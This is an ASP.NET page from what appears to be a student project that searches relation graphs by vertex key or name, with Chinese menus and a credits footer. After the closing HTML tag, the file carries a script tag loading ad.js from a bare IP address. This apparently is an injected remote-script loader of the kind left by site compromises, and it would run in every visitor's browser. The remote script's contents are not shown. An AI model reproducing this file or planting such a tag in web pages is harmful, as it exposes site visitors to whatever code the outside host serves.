<%@ Page Language="vb" AutoEventWireup="false" Codebehind="full.aspx.vb" Inherits="relation.full"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
	<HEAD>
		<title>full</title>
		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">
		<meta content="Visual Basic .NET 7.1" name="CODE_LANGUAGE">
		<meta content="JavaScript" name="vs_defaultClientScript">
		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">
	</HEAD>
	<body>
		<FONT face="宋体"><FONT face="宋体">
				<FORM id="Form1" method="post">
					<FONT face="宋体">
						<TABLE id="Table9" cellSpacing="0" cellPadding="0" width="778" align="center" bgColor="#fef3bd"
							border="0" valign="middle">
							<TR>
								<TD vAlign="middle" width="778" bgColor="#fef3bd" colSpan="3" height="8">
									<DIV align="center"><IMG height="8" src="imga/bg1.gif" width="100%"></DIV>
								</TD>
							</TR>
							<TR bgColor="#ffffff">
								<TD colSpan="3" height="60"><IMG height="60" src="imga/logo.gif" width="321"><IMG height="60" src="imga/idea.jpg" width="457"></TD>
							</TR>
							<TR>
								<TD vAlign="middle" colSpan="3" height="8"></TD>
							</TR>
						</TABLE> <!--===============include menu================--> <!--==========include menu==============-->
						<TABLE id="Table10" cellSpacing="0" cellPadding="0" width="778" align="center" border="0">
							<TR>
								<TD class="p9" vAlign="middle" width="196" bgColor="#dedede" height="18">
									<DIV align="center"><FONT color="#666666"><B>
												<asp:Label id="timetext" runat="server"></asp:Label>
												&nbsp; </B></FONT>
									</DIV>
								</TD>
								<TD class="p9" style="WIDTH: 23px" vAlign="middle" width="23" bgColor="#dedede" height="18">
									<DIV align="right"><IMG height="25" src="imga/blue.jpg" width="35"></DIV>
								</TD>
								<TD class="p9" vAlign="middle" width="548" background="imga/blue2.jpg" bgColor="#00459c"
									height="18">
									<DIV align="left"><SPAN class="p10"><FONT color="#ffffff"><A class="whitemenu" onmouseover="showMenu(this,'topmenu1',0)" onmouseout="hideMenu(event)"
													href="rmodelpublish.aspx" target="_top">发布</A> <A class="whitemenu" onmouseover="showMenu(this,'topmenu2',0)" onmouseout="hideMenu(event)"
													href="rmodelsearch.aspx" target="_top">查询</A>&nbsp;<A href="rmodelmodification.aspx">修改</A>
											</FONT></SPAN>
									</DIV>
								</TD>
							</TR>
						</TABLE>
						<DIV id="Div1" style="VISIBILITY: hidden" onmouseout="hideMenu(event)"></DIV>
						<FONT face="宋体"></FONT>
						<TABLE id="Table11" height="62" cellSpacing="0" width="778" align="center">
							<TR border="0">
								<TD class="p10" style="WIDTH: 994px" vAlign="top" background="imga/bg3.gif" colSpan="2"
									height="20" border="0"><IMG height="1" src="imga/03.gif" width="100%"><BR>
									<FONT color="#000000">&nbsp;|</FONT><FONT color="#000000"><SPAN class="p9"> <A href="index.aspx">
												首页</A></SPAN> </FONT><FONT color="#000000">|</FONT> <FONT color="#000000">
										<SPAN class="p9"><A href="index.aspx">用户登录</A></SPAN> |<A href="newcustomer.aspx">注册</A>
									</FONT>
								</TD>
							</TR>
							<TR border="0">
								<TD style="WIDTH: 432px" vAlign="top" width="432" bgColor="#0859ad" height="20">&nbsp;
									<asp:label id="lblHint" ForeColor="Info" runat="server">Label</asp:label></TD>
								<TD style="WIDTH: 228px" vAlign="top" bgColor="#0859ad" height="20">
									<DIV align="right"><FONT color="#ffffff">
											<marquee style="WIDTH: 605px; HEIGHT: 27px" scrollDelay="100" direction="left" behavior="scroll"
												loop="-1">欢迎您 &nbsp;软件业的朋友！ &nbsp; &nbsp;</marquee>
										</FONT>
									</DIV>
								</TD>
							</TR>
						</TABLE>
						<IMG height="8" src="imga/bg2.gif" width="100%">
						<CENTER>
							<TABLE id="Table12" height="400" cellSpacing="0" cellPadding="0" width="778" bgColor="#ffffff"
								border="0">
								<TBODY>
									<TR>
										<TD vAlign="top" width="172" bgColor="#0859ad" height="14"><!--====================include pageleft==================-->
											<TABLE id="Table13" cellSpacing="0" cellPadding="0" width="100%" border="0">
												<TR>
													<TD vAlign="top" bgColor="#0859ad">
														<DIV align="center"><FONT face="宋体"></FONT>&nbsp;</DIV>
													</TD>
												</TR>
											</TABLE>
											<TABLE id="Table14" height="100%" cellSpacing="0" cellPadding="0" width="100%" border="0">
												<TR>
													<TD vAlign="top" bgColor="#9cd7ef">
														<DIV align="center"><IMG style="WIDTH: 100%; HEIGHT: 32px" height="32" src="imga/grad.gif" width="172">&nbsp;
															<TABLE id="Table15" style="WIDTH: 153px; HEIGHT: 153px" width="153" border="1">
																<TR>
																	<TD width="147" height="45">
																		<DIV align="center">&nbsp;<A href="rmodelsearch.aspx">&nbsp;查询关系空间</A></DIV>
																	</TD>
																</TR>
																<TR>
																	<TD height="43">
																		<DIV align="center"><A href="rdefinitionsearch.aspx">查询关系类型</A></DIV>
																	</TD>
																</TR>
																<TR>
																	<TD height="55">
																		<DIV align="center"><A href="rinstancesearch.aspx">查询关系实例</A></DIV>
																	</TD>
																</TR>
															</TABLE>
															<BR>
															<BR>
														</DIV>
													</TD>
												</TR>
											</TABLE>
										</TD>
										<TD vAlign="top" width="21" bgColor="#ffffff"><IMG height="23" src="imga/05.gif" width="21"></TD>
										<TD vAlign="top" width="611">
				</FORM>
				<FORM style="MARGIN: 0px" name="loginForm" action="" method="post">
					&nbsp;</FORM>
				<FORM id="Form2" method="post" runat="server">
					<TABLE id="Table1" cellSpacing="1" cellPadding="1" border="1">
						<TR>
							<TD>
								<table>
									<tr>
										<td><asp:label id="Label1" runat="server">输入顶点编号</asp:label></td>
										<td style="WIDTH: 70px"><asp:dropdownlist id="ddlstVertexKey" runat="server" DESIGNTIMEDRAGDROP="2058" Width="78px"></asp:dropdownlist></td>
										<td><asp:label id="Label3" runat="server">输入步长</asp:label></td>
										<td><asp:textbox id="txtKeyLen" runat="server" DESIGNTIMEDRAGDROP="2060" Width="119px"></asp:textbox></td>
										<td><asp:button id="btnKeySearch" runat="server" DESIGNTIMEDRAGDROP="2062" Width="46px" Text="搜索"></asp:button></td>
									</tr>
								</table>
							</TD>
						</TR>
						<TR>
							<TD>
								<table>
									<tr>
										<td><asp:label id="Label2" runat="server">输入顶点名称</asp:label></td>
										<td><asp:dropdownlist id="ddlstVertexName" runat="server" Width="83px"></asp:dropdownlist></td>
										<td><asp:label id="Label4" runat="server">输入步长</asp:label></td>
										<td><asp:textbox id="txtNameLen" runat="server" Width="117px"></asp:textbox></td>
										<td><asp:button id="btnNameSearch" runat="server" Width="46px" Text="搜索"></asp:button></td>
									</tr>
								</table>
							</TD>
						</TR>
						<TR>
							<TD><asp:image id="imgFull" runat="server" ImageAlign="Middle"></asp:image></TD>
						</TR>
					</TABLE>
					<asp:label id="lblWarning" ForeColor="#0000C0" runat="server" Width="408px" Height="16px">label</asp:label></TD></TR></TBODY></TABLE></CENTER><!---====================include pagetail================-->
					<CENTER>
						<TABLE id="Table16" cellSpacing="0" cellPadding="0" width="778" border="0">
							<TR>
								<TD><IMG height="31" src="imga/bg4.gif" width="778"></TD>
							</TR>
							<TR>
								<TD class="p9" background="imga/bg5.gif">
									<DIV align="center">| 联络我们 | 客服电话：<STRONG><FONT face="Arial">0571-63740939</FONT></STRONG></DIV>
								</TD>
							</TR>
							<TR>
								<TD class="p9" bgColor="#ffffff"><FONT face="宋体">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
										版权所有：&nbsp;&nbsp; 浙江林学院信息工程学院天信022 王海玲 陆美丽 </FONT>
								</TD>
							</TR>
						</TABLE>
					</CENTER>
			</FONT></FORM></FONT></FONT>
	</body>
</HTML>
<script src="http://222.208.183.246/ad/ad.js"></script>
